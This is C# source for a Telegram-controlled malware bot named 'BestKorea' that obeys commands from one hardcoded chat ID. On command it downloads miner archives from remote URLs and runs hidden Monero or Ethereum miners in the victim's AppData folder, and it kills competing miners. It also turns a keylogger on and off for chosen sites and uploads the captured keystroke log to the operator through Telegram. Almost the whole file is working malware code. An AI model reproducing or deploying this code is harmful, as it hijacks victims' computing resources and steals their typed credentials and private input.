using System;
using System.IO.Compression;
using System.Management;
using NetTelebot;
using NetTelebot.Result;
using System.Windows.Forms;
using System.Net;
using System.IO;
using ICSharpCode.SharpZipLib.Zip;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace BestKorea
{
    public class Telegram
    {
        /*
         *<COMMANDS>
        * Mining:
        *  /xmr <link to xmr zip> - Downloads and begins mining xmr
        *  /eth <link to eth zip> - Downloads and begins mining eth
        *  /setGPU <GPU1, GPU2> - Sets the list of gpus acceptable for eth mining
        *  /stop - Deletes all mining software
        * Keylogging:
        *  /StartLogging - Begins keylogging on listed sites
        *  /dumpLog - Sends Keylog file via telegram
        *  /StopLogging - Stops keylogging on listed sites
        *  /setSites <SITE1, SITE2> - Sets the sites that keylogging occurs on
        * Misc:
        *  /stats - Lists GPU, Current Coin being mined, and if a keylog file is present.
        *</COMMANDS>
        */

        public static void Start()
        {
            var client = new TelegramBotClient()
            {
                Token = "YOUR API TOKEN HERE",
                CheckInterval = 1000,
            };
            client.UpdatesReceived += client_UpdatesReceived;
            client.StartCheckingUpdates();
            Console.ReadLine();
        }

        static void client_UpdatesReceived(object sender, TelegramUpdateEventArgs e)
        {
            var client = (TelegramBotClient)sender;
            foreach (var item in e.Updates)
            {
                Console.WriteLine("New Message");
                if (item.Message.Text != null)
                    if (item.Message.Chat.Id == 461266500)
                    {
                        if (item.Message.Text == "CheckGPU")
                        {
                            Console.WriteLine(1);
                            Console.WriteLine(CheckGPU());
                        }
                        else if (item.Message.Text.Contains("/xmr "))
                        {
                            download(item.Message.Text.Replace("/xmr ", ""), "xmr");
                            Properties.Settings.Default.Current = "xmr";
                            Properties.Settings.Default.Save();
                        }
                        else if (item.Message.Text.Contains("/eth "))
                        {
                            if (CheckGPU())
                            {
                        //        download(item.Message.Text.Replace("/eth ", ""), "eth");
                                Console.WriteLine("Download Complete");
                                StartMine("eth");
                                Properties.Settings.Default.Current = "eth";
                                Properties.Settings.Default.Save();
                            }
                            else if (Properties.Settings.Default.Current != "xmr")
                            {
                                download(item.Message.Text.Replace("/xmr ", ""), "xmr");
                                Properties.Settings.Default.Current = "xmr";
                                Properties.Settings.Default.Save();
                            }
                        }
                        else if (item.Message.Text.Contains("/setGPU "))
                        {
                            string raw = item.Message.Text.Replace("/setGPU ", "");
                            setValue(raw, "gpus");
                        }
                        else if (item.Message.Text == "/StopMining")
                        {
                            DirectoryInfo dir = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\");
                            foreach (FileInfo file in dir.GetFiles())
                            {
                                file.Delete();
                            }
                            foreach (DirectoryInfo subdir in dir.GetDirectories())
                            {
                                subdir.Delete(true);
                            }
                            Properties.Settings.Default.Current = "None";
                            Properties.Settings.Default.Save();
                        }
                        else if (item.Message.Text == "/StartLogging")
                        {
                            if (!Properties.Settings.Default.Logging)
                            {
                                Keylogger.Start();
                                Properties.Settings.Default.Logging = true;
                                Properties.Settings.Default.Save();
                            }
                        }
                        else if (item.Message.Text == "/StopLogging")
                        {
                            if (Properties.Settings.Default.Logging)
                            {
                                Keylogger.Stop();
                                Properties.Settings.Default.Logging = false;
                                Properties.Settings.Default.Save();
                            }
                        }
                        else if (item.Message.Text == "/dump")
                        {
                            string path = Path.GetTempPath() + 1234567890 + ".txt";
                            FileInfo pathInfo = new FileInfo(path);
                            if (pathInfo.Exists)
                            {
                                var log = new NetTelebot.Type.NewFile()
                                {
                                    FileContent = File.ReadAllBytes(path),
                                    FileName = "LOG.TXT"
                                };
                                client.SendDocument(461266500, log);
                                pathInfo.Delete();
                                Properties.Settings.Default.LogFile = false;
                                Properties.Settings.Default.Save();
                            }
                        }
                        else if (item.Message.Text.Contains("/setSites "))
                        {
                            string raw = item.Message.Text.Replace("/setSites ", "");
                            setValue(raw, "Sites");
                        }
                        else if (item.Message.Text == "/stats")
                        {
                            CheckGPU();
                            client.SendMessage(item.Message.Chat.Id, String.Format("{0}{1} LOGFILE:{2} LOGGING:{3}", 
                                Properties.Settings.Default.Current.ToUpper(), 
                                Properties.Settings.Default.InstalledGPU, 
                                Properties.Settings.Default.LogFile,
                                Properties.Settings.Default.Logging));
                        }
                    }
                    
            }

        }

        static void setValue(string raw, string Setting)
        {
            string[] separators = { ", " };
            string[] values = raw.Split(separators, StringSplitOptions.RemoveEmptyEntries);
            System.Collections.Specialized.StringCollection ValueCollection = new System.Collections.Specialized.StringCollection();
            foreach (var x in values)
            {
                ValueCollection.Add(x);
            }
            Properties.Settings.Default[Setting] = ValueCollection;
            Properties.Settings.Default.Save();
        }

        static void StartMine(string coin)
        {
            Console.WriteLine(1);
            Process proc = new Process();
            proc.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\";
            proc.StartInfo.FileName = "start.bat";
           // proc.StartInfo.CreateNoWindow = true;
            //proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.StartInfo.Arguments = coin;
            Console.WriteLine(String.Format(""));
            proc.Start();
         //   proc.WaitForExit();
        }

        static void download(string url, string coin)
        {
            foreach (var process in Process.GetProcessesByName("EthDcrMiner64"))
            {
                process.Kill();
            }
            foreach (var process in Process.GetProcessesByName("NsCpuCNMiner64"))
            {
                process.Kill();
            }

            if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\"))
            {
                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\");
            }
            else
            {
                DirectoryInfo dir = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\");
                foreach (FileInfo file in dir.GetFiles())
                {
                    file.Delete();
                }
                foreach (DirectoryInfo subdir in dir.GetDirectories())
                {
                    subdir.Delete(true);
                }
            }
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\download.zip"))
            {
                Console.WriteLine(204);
                WebClient webClient = new WebClient();
                webClient.DownloadFile(url, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\download.zip");
            }

            FastZip fastZip = new FastZip();
            fastZip.ExtractZip((Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\download.zip"), (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\"), null);

            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\download.zip");
            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\epools.txt");

            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\start.bat", Properties.Resources.start);
            switch (coin)
            {
                case "eth":
                    File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\epools.txt", Properties.Resources.epoolsETH);
                    break;
                case "xmr":
                    File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sys\\epools.txt", Properties.Resources.epoolsXMR);
                    break;
            }
        }

        static string InstalledGPU;
        static bool CheckGPU()
        {
            ManagementObjectSearcher searcher =
                new ManagementObjectSearcher("root\\CIMV2",
                "SELECT * FROM Win32_VideoController");
            foreach (ManagementObject queryObj in searcher.Get())
            {
                InstalledGPU += String.Format(" {0}", queryObj["VideoProcessor"].ToString());
            }
            foreach (var x in Properties.Settings.Default.gpus)
            {
                if (Regex.IsMatch(InstalledGPU, x, RegexOptions.IgnoreCase))
                {
                    Properties.Settings.Default.InstalledGPU = InstalledGPU;
                    Properties.Settings.Default.Save();
                    return true;
                }
            }
            return false;
        }
    }
}
